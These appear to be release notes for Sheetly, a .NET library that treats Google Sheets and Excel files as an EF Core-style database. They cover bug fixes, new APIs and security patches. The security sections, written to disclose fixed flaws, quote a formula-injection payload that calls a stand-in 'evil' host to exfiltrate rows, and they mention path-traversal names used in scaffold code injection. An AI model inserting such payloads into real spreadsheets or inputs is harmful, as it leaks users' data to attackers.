# 🐛 Sheetly v1.3.1 — please update

This one is all bug fixes, and a few of them are the kind that quietly eat your data. No API changed,
no code to rewrite — just bump the version.

**If you use `record` entities, or you override `Equals` / `GetHashCode`, update now.** The change
tracker was keying entities by *value*, so the moment you edited a property the entity became a
different key. The fallout: your edit got saved as a brand-new row, the original was left orphaned,
and every following `SaveChanges` appended the whole set again. Two `record`s that happened to be
equal collapsed into one, and one of them never got an id.

**Cascade and set-null deletes now tell the change tracker what they did.** They used to write
straight to the sheet behind its back, which left the surviving children pointing at the wrong row
numbers — so your next edit to a sibling would land on, and overwrite, someone else's row. Children
removed by a cascade stayed in the tracker as zombies, and a `SetNull` never showed up in memory, so
the entity turned into a brick that threw a bogus foreign-key error on every later save.

Also fixed:

- **Excel: `EnsureDeleted()` on a file that doesn't exist yet** crashed with *"Workbooks need at least
  one worksheet"*. It doesn't anymore.
- **Inherited models** that shadow a base property with `new` no longer crash the mapper.
- **`Sheetly.DependencyInjection` no longer drags in `Sheetly.Google`.** If you use DI *and* Google
  Sheets, add `Sheetly.Google` yourself: `dotnet add package Sheetly.Google`. (The README always told
  you to — now the package graph agrees.) Excel-only users stop pulling the Google API client
  entirely. This is why DI jumps to **1.4.0** while everything else is **1.3.1**.

---

# 🚀 Sheetly v1.3.0 — it's EF Core, except the database is a spreadsheet

Know EF Core? Then you already know Sheetly. This release adds the APIs your fingers reach for
on autopilot — `Set<T>()`, `ChangeTracker`, `EnsureCreated`, navigation fixup, `LogTo` — so going
from a "real" database to a Google Sheet (or a local `.xlsx`) feels like nothing changed.

It's a big release with a handful of breaking changes. Skim [BREAKING_CHANGES.md](BREAKING_CHANGES.md)
first — it's short.

---

## ✨ Now it feels like home

- **The context surface you expect** — `Set<T>()`, `IEntityTypeConfiguration<T>` with `ApplyConfiguration(...)` / `ApplyConfigurationsFromAssembly(...)`, and `ToTable(...)` (an alias for `HasSheetName`).
- **`EnsureCreated()` — start in 4 lines, no CLI needed:**

  ```csharp
  await using var ctx = new AppDbContext();     // UseGoogleSheets(...) / UseExcel(...) in OnConfiguring
  await ctx.Database.EnsureCreatedAsync();       // builds the sheets straight from your POCOs
  ctx.Products.Add(new Product { Title = "Hello", Price = 9.99m });
  await ctx.SaveChangesAsync();
  ```

- **Navigation fixup** — set the navigation and Sheetly fills in the foreign key for you, even when the parent's `Id` is generated in the *same* `SaveChanges`:

  ```csharp
  var cat = new Category { Name = "Tools" };
  var prod = new Product { Title = "Hammer", Category = cat };  // no CategoryId
  ctx.Categories.Add(cat);
  ctx.Products.Add(prod);
  await ctx.SaveChangesAsync();   // cat gets an Id, prod.CategoryId is filled automatically
  ```

- **`Entry` / `ChangeTracker`** — `context.Entry(e)`, `CurrentValues` / `OriginalValues`, `ChangeTracker.Entries()`, `Attach`, `set.Local`. The change-tracking API you already use.
- **All the async LINQ** — `FirstAsync`, `SingleAsync`, `CountAsync`, `SumAsync`, `ToDictionaryAsync`, `AddRange` / `RemoveRange`, `OrderBy(...).ThenBy(...)`, composable `Select` / `Distinct` — the full terminal set.
- **`Ignore` / `[NotMapped]`** — keep computed or transient properties out of the sheet.
- **`LogTo(Console.WriteLine)`** — watch every `SaveChanges`, API call, and 429 retry, EF-style.
- **`AddSheetsContextFactory<T>()`** — the `IDbContextFactory` analog, properly async, for ASP.NET and background jobs.

---

## 🔒 We finished off "sheets injection"

Spreadsheets have their own take on SQL injection. Type `=IMPORTXML("https://evil","//x")` into a
cell and Google happily *runs it* — quietly shipping your rows to a stranger the moment someone opens
the sheet. v1.2.1 stopped writing user text as live formulas; **v1.3.0 finishes the job** by switching
to Google's `RAW` write mode. Your strings are now stored exactly as typed and never evaluated — a `=`
is just a `=`.

The same change killed a locale bug on the way out: numbers, dates, and booleans round-trip
byte-for-byte no matter your machine's region (no more `1,234` turning into a mystery cell in the EU).

---

## 🐛 The boring-but-important fixes

- **Change tracking** — entities stay tracked after `SaveChanges`, so edit → save → edit → save just works; deleting a parent cascades safely; and an `Update` / `Remove` on a row that's already gone now tells you instead of silently doing nothing.
- **Column order** — insert a property in the *middle* of your class and your data no longer scrambles; lookups find the primary key by its header instead of assuming column A.
- **Migrations** — column renames are detected (your data moves with the column instead of getting dropped and re-added), a generated `Down()` fully rebuilds whatever `Up()` changed, and `migrations list` shows what's applied vs. pending.
- **CLI** — works even when your `DbContext` lives in a class-library project, not just an executable.
- **Excel** — writes are batched and saved once per `SaveChanges` instead of on every single cell.

---

## 📦 Packages (all `1.3.0`)

| Package | What it's for |
|---|---|
| `Sheetly.Core` | The ORM — context, LINQ, migrations, validation |
| `Sheetly.Google` | Google Sheets backend |
| `Sheetly.Excel` | Local `.xlsx` backend |
| `Sheetly.DependencyInjection` | ASP.NET Core wiring |
| `dotnet-sheetly` | CLI for migrations & scaffolding |

`Sheetly.Core` no longer depends on ClosedXML — a lighter core.

---

## ⬆️ Upgrading from 1.2.x

The full list is in [BREAKING_CHANGES.md](BREAKING_CHANGES.md), but the short version:

- Values are written in `RAW` / native mode now — new `DateTime` cells are ISO text, and a leading `=` stays text.
- Entities stay tracked after `SaveChanges`; a disconnected `Update` / `Remove` of a missing row now throws instead of quietly doing nothing.
- `AsNoTracking()` / `Include(...)` no longer "stick" to the next query on the same set.
- Recompile against 1.3.0 — `ChangeTracker.Entries()` and `Entry(entity)` hand you an `EntityEntry`, so you can read and set `State` directly.

---

# 🔒 Sheetly v1.2.1 — the security patch

A small, drop-in patch over v1.2.0. No new features, no API changes — it just closes two nasty
security holes and one silent data-corruption bug. If you're on 1.2.0, upgrade.

### Sheets injection (critical)

The spreadsheet cousin of SQL injection: user text starting with `=`, `+`, `-`, or `@` was written as
a **live formula**, so `=IMPORTXML(...)` could exfiltrate rows and `=HYPERLINK(...)` could phish
whoever opened the sheet. Such values are now stored as plain text. (v1.3.0 above takes this further
with `RAW` mode.)

### Scaffold code injection (critical)

`dotnet sheetly scaffold` turned the remote schema sheet into C# without checking the names — so anyone
with edit access to a shared sheet could sneak a class/property name that compiled arbitrary code into
your project, or a `../../Program`-style name that wrote outside the output folder. Names are now
strictly validated and sanitized.

### And a few smaller ones

- Sheet names with apostrophes can no longer break out of a range reference.
- Inserting a property in the middle of a model no longer scrambles later writes (writes are header-driven).
- Reordering properties no longer wedges the context on startup (the model hash is order-insensitive).
- Generated migrations escape special characters and format decimals invariantly, so they always compile.
- Release workflows dropped a command-injection gap and now run with least-privilege permissions.

> One heads-up: **existing sheets aren't rewritten.** Cells that v1.2.0 already turned into live
> formulas stay formulas until you overwrite them — this patch only stops *new* injected writes. Give
> any sheet that took untrusted input under v1.2.0 a quick look.
